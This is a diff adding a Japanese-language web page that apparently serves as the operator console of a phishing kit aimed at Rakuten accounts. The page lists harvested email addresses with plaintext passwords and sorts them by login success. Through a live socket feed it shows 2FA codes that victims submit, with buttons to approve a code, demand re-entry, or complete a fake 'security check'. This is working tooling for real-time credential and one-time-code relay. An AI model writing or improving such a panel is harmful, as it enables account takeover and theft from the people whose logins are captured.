@@ -1,0 +1,980 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>アカウント管理 - 楽天ログイン管理システム</title>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Helvetica Neue", Arial, "Hiragino Kaku Gothic ProN", "Hiragino Sans", Meiryo, sans-serif;
+            background-color: #f4f5fa;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .header {
+            background-color: white;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header h1 {
+            color: #bf0000;
+            font-size: 24px;
+            font-weight: 400;
+        }
+
+        .back-button {
+            padding: 10px 20px;
+            background-color: #666;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .back-button:hover {
+            background-color: #555;
+        }
+
+        .blocks-section {
+            background-color: white;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .blocks-section h2 {
+            color: #333;
+            font-size: 20px;
+            font-weight: 500;
+            margin-bottom: 20px;
+        }
+
+        .blocks-container {
+            display: flex;
+            gap: 15px;
+            overflow-x: auto;
+            padding-bottom: 10px;
+        }
+
+        .block {
+            min-width: 250px;
+            background-color: #f8f9fa;
+            border: 2px solid #dee2e6;
+            border-radius: 8px;
+            padding: 15px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .block:hover {
+            border-color: #bf0000;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .block-email {
+            font-size: 14px;
+            color: #333;
+            font-weight: 500;
+            margin-bottom: 5px;
+            word-break: break-all;
+        }
+
+        .block-password {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 10px;
+            word-break: break-all;
+        }
+
+        .block-delete-btn {
+            width: 100%;
+            padding: 8px;
+            background-color: #dc3545;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 13px;
+            cursor: pointer;
+        }
+
+        .block-delete-btn:hover {
+            background-color: #c82333;
+        }
+
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .tab {
+            padding: 12px 24px;
+            background-color: white;
+            border: 2px solid #dee2e6;
+            border-radius: 8px 8px 0 0;
+            cursor: pointer;
+            font-size: 16px;
+            color: #666;
+            transition: all 0.2s;
+        }
+
+        .tab.active {
+            background-color: #bf0000;
+            color: white;
+            border-color: #bf0000;
+        }
+
+        .tab:hover:not(.active) {
+            background-color: #f8f9fa;
+        }
+
+        .accounts-section {
+            background-color: white;
+            padding: 20px;
+            border-radius: 0 8px 8px 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .account-item {
+            border: 1px solid #dee2e6;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .account-info {
+            flex: 1;
+        }
+
+        .account-email {
+            font-size: 16px;
+            color: #333;
+            font-weight: 500;
+            margin-bottom: 5px;
+        }
+
+        .account-password {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .detail-button {
+            padding: 10px 20px;
+            background-color: #bf0000;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .detail-button:hover {
+            background-color: #a00000;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .modal.show {
+            display: flex;
+        }
+
+        .modal-content {
+            background-color: white;
+            border-radius: 8px;
+            padding: 30px;
+            max-width: 600px;
+            width: 100%;
+            max-height: 80vh;
+            overflow-y: auto;
+            position: relative;
+        }
+
+        .modal-header {
+            font-size: 20px;
+            font-weight: 500;
+            color: #333;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #dee2e6;
+        }
+
+        .modal-section {
+            margin-bottom: 20px;
+        }
+
+        .modal-label {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 5px;
+        }
+
+        .modal-value {
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 15px;
+            word-break: break-all;
+        }
+
+        .code-item {
+            background-color: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 6px;
+            padding: 15px;
+            margin-bottom: 15px;
+        }
+
+        .code-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .code-value {
+            font-size: 20px;
+            font-weight: 600;
+            color: #bf0000;
+            font-family: monospace;
+        }
+
+        .code-time {
+            font-size: 13px;
+            color: #666;
+        }
+
+        .code-status {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        .code-status.pending {
+            background-color: #fff3cd;
+            color: #856404;
+        }
+
+        .code-status.approved {
+            background-color: #d4edda;
+            color: #155724;
+        }
+
+        .code-status.rejected {
+            background-color: #f8d7da;
+            color: #721c24;
+        }
+
+        .code-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .code-button {
+            flex: 1;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .code-button.approve {
+            background-color: #28a745;
+            color: white;
+        }
+
+        .code-button.approve:hover:not(:disabled) {
+            background-color: #218838;
+        }
+
+        .code-button.reject {
+            background-color: #ffc107;
+            color: #333;
+        }
+
+        .code-button.reject:hover:not(:disabled) {
+            background-color: #e0a800;
+        }
+
+        .code-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .security-button {
+            width: 100%;
+            padding: 15px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .security-button:hover:not(:disabled) {
+            background-color: #0056b3;
+        }
+
+        .security-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .modal-footer {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #dee2e6;
+        }
+
+        .modal-close-btn {
+            flex: 1;
+            padding: 12px;
+            background-color: #6c757d;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .modal-close-btn:hover {
+            background-color: #5a6268;
+        }
+
+        .modal-block-delete-btn {
+            flex: 1;
+            padding: 12px;
+            background-color: #dc3545;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .modal-block-delete-btn:hover {
+            background-color: #c82333;
+        }
+
+        .history-item {
+            padding: 8px 0;
+            border-bottom: 1px solid #dee2e6;
+        }
+
+        .history-item:last-child {
+            border-bottom: none;
+        }
+
+        .history-time {
+            font-size: 14px;
+            color: #333;
+        }
+
+        .history-status {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 3px;
+            font-size: 12px;
+            margin-left: 10px;
+        }
+
+        .history-status.success {
+            background-color: #d4edda;
+            color: #155724;
+        }
+
+        .history-status.failed {
+            background-color: #f8d7da;
+            color: #721c24;
+        }
+
+        .empty-message {
+            text-align: center;
+            padding: 40px;
+            color: #666;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>アカウント管理</h1>
+        <a href="/admin/top" class="back-button">戻る</a>
+    </div>
+
+    <div class="blocks-section">
+        <h2>2FA・セキュリティチェック管理</h2>
+        <div class="blocks-container" id="blocksContainer">
+            <div class="empty-message">現在進行中のセッションはありません</div>
+        </div>
+    </div>
+
+    <div class="tabs">
+        <div class="tab active" data-tab="success">成功</div>
+        <div class="tab" data-tab="failed">失敗</div>
+    </div>
+
+    <div class="accounts-section">
+        <div class="tab-content active" id="successTab">
+            <div id="successAccounts"></div>
+        </div>
+        <div class="tab-content" id="failedTab">
+            <div id="failedAccounts"></div>
+        </div>
+    </div>
+
+    <!-- ブロック詳細モーダル -->
+    <div class="modal" id="blockModal">
+        <div class="modal-content">
+            <div class="modal-header">2FA・セキュリティチェック管理</div>
+            
+            <div class="modal-section">
+                <div class="modal-label">メールアドレス</div>
+                <div class="modal-value" id="modalEmail"></div>
+            </div>
+
+            <div class="modal-section">
+                <div class="modal-label">パスワード</div>
+                <div class="modal-value" id="modalPassword"></div>
+            </div>
+
+            <div class="modal-section">
+                <div class="modal-label">2FAコード履歴</div>
+                <div id="modalCodes"></div>
+            </div>
+
+            <button class="security-button" id="securityCompleteBtn" disabled>
+                セキュリティチェック完了
+            </button>
+
+            <div class="modal-footer">
+                <button class="modal-close-btn" onclick="closeBlockModal()">閉じる</button>
+                <button class="modal-block-delete-btn" onclick="deleteBlock()">ブロック削除</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- アカウント詳細モーダル -->
+    <div class="modal" id="accountModal">
+        <div class="modal-content">
+            <div class="modal-header">アカウント詳細</div>
+            
+            <div class="modal-section">
+                <div class="modal-label">メールアドレス</div>
+                <div class="modal-value" id="accountModalEmail"></div>
+            </div>
+
+            <div class="modal-section">
+                <div class="modal-label">パスワード</div>
+                <div class="modal-value" id="accountModalPassword"></div>
+            </div>
+
+            <div class="modal-section">
+                <div class="modal-label">ログイン履歴</div>
+                <div id="accountModalHistory"></div>
+            </div>
+
+            <div class="modal-footer">
+                <button class="modal-close-btn" onclick="closeAccountModal()">閉じる</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let socket = null;
+        let currentBlockData = null;
+
+        // 初期化
+        document.addEventListener('DOMContentLoaded', () => {
+            // WebSocket接続
+            socket = io();
+            
+            socket.on('connect', () => {
+                console.log('[WebSocket] 接続成功');
+                socket.emit('join_admin_room');
+            });
+
+            socket.on('block_created', (data) => {
+                console.log('[WebSocket] ブロック作成通知', data);
+                loadActiveSessions();
+            });
+
+            socket.on('twofa_code_submitted', (data) => {
+                console.log('[WebSocket] 2FAコード送信通知', data);
+                console.log('[デバッグ] currentBlockData:', currentBlockData);
+                console.log('[デバッグ] data.email:', data.email);
+                console.log('[デバッグ] 一致するか?:', currentBlockData && currentBlockData.email === data.email);
+                
+                loadActiveSessions();
+                
+                // ★追加：モーダルが開いていて、同じアカウントなら自動更新★
+                if (currentBlockData && currentBlockData.email === data.email) {
+                    console.log('[デバッグ] updateModalContent呼び出し');
+                    updateModalContent(data);
+                } else {
+                    console.log('[デバッグ] モーダル更新スキップ');
+                }
+            });
+
+            // ★追加：セキュリティチェック送信イベント★
+            socket.on('security_check_submitted', (data) => {
+                console.log('[WebSocket] セキュリティチェック送信通知', data);
+                loadActiveSessions();
+                
+                // モーダルが開いていて、同じアカウントなら自動更新
+                if (currentBlockData && currentBlockData.email === data.email) {
+                    updateModalContent(data);
+                }
+            });
+
+            // タブ切り替え
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.addEventListener('click', () => {
+                    switchTab(tab.dataset.tab);
+                });
+            });
+
+            // 初期データ読み込み
+            loadActiveSessions();
+            loadAccounts();
+        });
+
+        // タブ切り替え
+        function switchTab(tabName) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+            
+            document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');
+            document.getElementById(`${tabName}Tab`).classList.add('active');
+        }
+
+        // アクティブセッション読み込み
+        async function loadActiveSessions() {
+            try {
+                const response = await fetch('/api/admin/active-sessions');
+                const data = await response.json();
+                
+                if (data.success) {
+                    renderBlocks(data.sessions);
+                }
+            } catch (error) {
+                console.error('セッション読み込みエラー:', error);
+            }
+        }
+
+        // ブロック表示
+        function renderBlocks(sessions) {
+            const container = document.getElementById('blocksContainer');
+            
+            if (sessions.length === 0) {
+                container.innerHTML = '<div class="empty-message">現在進行中のセッションはありません</div>';
+                return;
+            }
+
+            // 優先順位でソート（pendingを優先、同じ優先度なら古い順）
+            sessions.sort((a, b) => {
+                const aPending = a.session.codes.some(c => c.status === 'pending');
+                const bPending = b.session.codes.some(c => c.status === 'pending');
+                
+                if (aPending && !bPending) return -1;
+                if (!aPending && bPending) return 1;
+                
+                return new Date(a.session.created_at) - new Date(b.session.created_at);
+            });
+
+            container.innerHTML = sessions.map(session => `
+                <div class="block" onclick='openBlockModal(${JSON.stringify(session)})'>
+                    <div class="block-email">${escapeHtml(session.email)}</div>
+                    <div class="block-password">${escapeHtml(session.password)}</div>
+                    <button class="block-delete-btn" onclick="event.stopPropagation(); confirmDeleteBlock('${escapeHtml(session.email)}', '${escapeHtml(session.password)}')">
+                        削除
+                    </button>
+                </div>
+            `).join('');
+        }
+
+        // ★追加：モーダル内容を更新（リロード不要）★
+        function updateModalContent(data) {
+            console.log('[モーダル更新] 関数実行開始');
+            console.log('[モーダル更新] データ受信', data);
+            console.log('[モーダル更新] data.session:', data.session);
+            
+            // currentBlockDataを更新
+            currentBlockData.session = data.session;
+            currentBlockData.password = data.password;
+            
+            console.log('[モーダル更新] currentBlockData更新後:', currentBlockData);
+            
+            // 2FAコード履歴を更新
+            const codesHtml = data.session.codes.length > 0
+                ? data.session.codes.map((code) => `
+                    <div class="code-item">
+                        <div class="code-header">
+                            <div>
+                                <div class="code-value">${code.code}</div>
+                                <div class="code-time">${formatDateTime(code.datetime)}</div>
+                            </div>
+                            <span class="code-status ${code.status}">${getStatusLabel(code.status)}</span>
+                        </div>
+                        <div class="code-buttons">
+                            <button class="code-button approve" 
+                                    onclick="approve2FA('${code.code}')"
+                                    ${code.status !== 'pending' ? 'disabled' : ''}>
+                                承認
+                            </button>
+                            <button class="code-button reject" 
+                                    onclick="reject2FA('${code.code}')"
+                                    ${code.status !== 'pending' ? 'disabled' : ''}>
+                                再入力
+                            </button>
+                        </div>
+                    </div>
+                `).join('')
+                : '<div class="empty-message">2FAコードはまだ送信されていません</div>';
+            
+            document.getElementById('modalCodes').innerHTML = codesHtml;
+            console.log('[モーダル更新] HTML更新完了');
+            
+            // セキュリティチェック完了ボタンの有効化判定
+            const hasApproved = data.session.codes.some(c => c.status === 'approved');
+            const securityCompleted = data.session.security_check_completed;
+            document.getElementById('securityCompleteBtn').disabled = !hasApproved || securityCompleted;
+            
+            console.log('[モーダル更新] ボタン状態更新完了 | hasApproved:', hasApproved, '| securityCompleted:', securityCompleted);
+        }
+
+        // ブロックモーダルを開く
+        function openBlockModal(sessionData) {
+            currentBlockData = sessionData;
+            
+            document.getElementById('modalEmail').textContent = sessionData.email;
+            document.getElementById('modalPassword').textContent = sessionData.password;
+            
+            const codesHtml = sessionData.session.codes.length > 0
+                ? sessionData.session.codes.map((code, index) => `
+                    <div class="code-item">
+                        <div class="code-header">
+                            <div>
+                                <div class="code-value">${code.code}</div>
+                                <div class="code-time">${formatDateTime(code.datetime)}</div>
+                            </div>
+                            <span class="code-status ${code.status}">${getStatusLabel(code.status)}</span>
+                        </div>
+                        <div class="code-buttons">
+                            <button class="code-button approve" 
+                                    onclick="approve2FA('${code.code}')"
+                                    ${code.status !== 'pending' ? 'disabled' : ''}>
+                                承認
+                            </button>
+                            <button class="code-button reject" 
+                                    onclick="reject2FA('${code.code}')"
+                                    ${code.status !== 'pending' ? 'disabled' : ''}>
+                                再入力
+                            </button>
+                        </div>
+                    </div>
+                `).join('')
+                : '<div class="empty-message">2FAコードはまだ送信されていません</div>';
+            
+            document.getElementById('modalCodes').innerHTML = codesHtml;
+            
+            // セキュリティチェック完了ボタンの有効化判定
+            const hasApproved = sessionData.session.codes.some(c => c.status === 'approved');
+            const securityCompleted = sessionData.session.security_check_completed;
+            document.getElementById('securityCompleteBtn').disabled = !hasApproved || securityCompleted;
+            
+            document.getElementById('blockModal').classList.add('show');
+        }
+
+        // ブロックモーダルを閉じる
+        function closeBlockModal() {
+            document.getElementById('blockModal').classList.remove('show');
+            currentBlockData = null;
+        }
+
+        // モーダル外クリックで閉じる
+        document.getElementById('blockModal').addEventListener('click', (e) => {
+            if (e.target.id === 'blockModal') {
+                closeBlockModal();
+            }
+        });
+
+        document.getElementById('accountModal').addEventListener('click', (e) => {
+            if (e.target.id === 'accountModal') {
+                closeAccountModal();
+            }
+        });
+
+        // 2FA承認
+        async function approve2FA(code) {
+            if (!currentBlockData) return;
+            
+            if (!confirm('この2FAコードを承認しますか？')) return;
+            
+            try {
+                const response = await fetch('/api/admin/2fa/approve', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        email: currentBlockData.email,
+                        password: currentBlockData.password,
+                        code: code
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    alert('2FAコードを承認しました');
+                    // モーダルは閉じない（自動更新される）
+                } else {
+                    alert('エラー: ' + data.message);
+                }
+            } catch (error) {
+                console.error('承認エラー:', error);
+                alert('エラーが発生しました');
+            }
+        }
+
+        // 2FA再入力要求
+        async function reject2FA(code) {
+            if (!currentBlockData) return;
+            
+            if (!confirm('この2FAコードの再入力を要求しますか？')) return;
+            
+            try {
+                const response = await fetch('/api/admin/2fa/reject', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        email: currentBlockData.email,
+                        password: currentBlockData.password,
+                        code: code
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    alert('再入力を要求しました');
+                    // モーダルは閉じない（自動更新される）
+                } else {
+                    alert('エラー: ' + data.message);
+                }
+            } catch (error) {
+                console.error('再入力要求エラー:', error);
+                alert('エラーが発生しました');
+            }
+        }
+
+        // セキュリティチェック完了
+        document.getElementById('securityCompleteBtn').addEventListener('click', async () => {
+            if (!currentBlockData) return;
+            
+            if (!confirm('セキュリティチェックを完了しますか？')) return;
+            
+            try {
+                const response = await fetch('/api/admin/security-complete', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        email: currentBlockData.email,
+                        password: currentBlockData.password
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    alert('セキュリティチェックを完了しました');
+                    closeBlockModal();
+                    loadActiveSessions();
+                } else {
+                    alert('エラー: ' + data.message);
+                }
+            } catch (error) {
+                console.error('完了エラー:', error);
+                alert('エラーが発生しました');
+            }
+        });
+
+        // ブロック削除確認
+        function confirmDeleteBlock(email, password) {
+            if (!confirm('このブロックを削除しますか？\n2FAコード履歴も削除されます。')) return;
+            
+            deleteBlockByEmailPassword(email, password);
+        }
+
+        // ブロック削除（モーダル内ボタン）
+        async function deleteBlock() {
+            if (!currentBlockData) return;
+            
+            if (!confirm('このブロックを削除しますか？\n2FAコード履歴も削除されます。')) return;
+            
+            await deleteBlockByEmailPassword(currentBlockData.email, currentBlockData.password);
+            closeBlockModal();
+        }
+
+        // ブロック削除API呼び出し
+        async function deleteBlockByEmailPassword(email, password) {
+            try {
+                const response = await fetch('/api/admin/block/delete', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        password: password
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    alert('ブロックを削除しました');
+                    loadActiveSessions();
+                } else {
+                    alert('エラー: ' + data.message);
+                }
+            } catch (error) {
+                console.error('削除エラー:', error);
+                alert('エラーが発生しました');
+            }
+        }
+
+        // アカウント一覧読み込み
+        async function loadAccounts() {
+            try {
+                const response = await fetch('/api/admin/accounts');
+                const data = await response.json();
+                
+                if (data.success) {
+                    renderAccounts('success', data.success_accounts);
+                    renderAccounts('failed', data.failed_accounts);
+                }
+            } catch (error) {
+                console.error('アカウント読み込みエラー:', error);
+            }
+        }
+
+        // アカウント表示
+        function renderAccounts(type, accounts) {
+            const container = document.getElementById(`${type}Accounts`);
+            
+            if (accounts.length === 0) {
+                container.innerHTML = '<div class="empty-message">アカウントがありません</div>';
+                return;
+            }
+
+            container.innerHTML = accounts.map(account => `
+                <div class="account-item">
+                    <div class="account-info">
+                        <div class="account-email">${escapeHtml(account.email)}</div>
+                        <div class="account-password">${escapeHtml(account.password)}</div>
+                    </div>
+                    <button class="detail-button" onclick='openAccountModal(${JSON.stringify(account)})'>
+                        詳細
+                    </button>
+                </div>
+            `).join('');
+        }
+
+        // アカウント詳細モーダルを開く
+        function openAccountModal(account) {
+            document.getElementById('accountModalEmail').textContent = account.email;
+            document.getElementById('accountModalPassword').textContent = account.password;
+            
+            const historyHtml = account.login_history.map(history => `
+                <div class="history-item">
+                    <span class="history-time">${formatDateTime(history.datetime)}</span>
+                    <span class="history-status ${history.status}">${history.status === 'success' ? '成功' : '失敗'}</span>
+                </div>
+            `).join('');
+            
+            document.getElementById('accountModalHistory').innerHTML = historyHtml;
+            document.getElementById('accountModal').classList.add('show');
+        }
+
+        // アカウント詳細モーダルを閉じる
+        function closeAccountModal() {
+            document.getElementById('accountModal').classList.remove('show');
+        }
+
+        // ユーティリティ関数
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        function formatDateTime(datetime) {
+            const date = new Date(datetime);
+            return date.toLocaleString('ja-JP');
+        }
+
+        function getStatusLabel(status) {
+            const labels = {
+                'pending': '未承認',
+                'approved': '承認済み',
+                'rejected': '再入力要求'
+            };
+            return labels[status] || status;
+        }
+    </script>
+</body>
+</html>
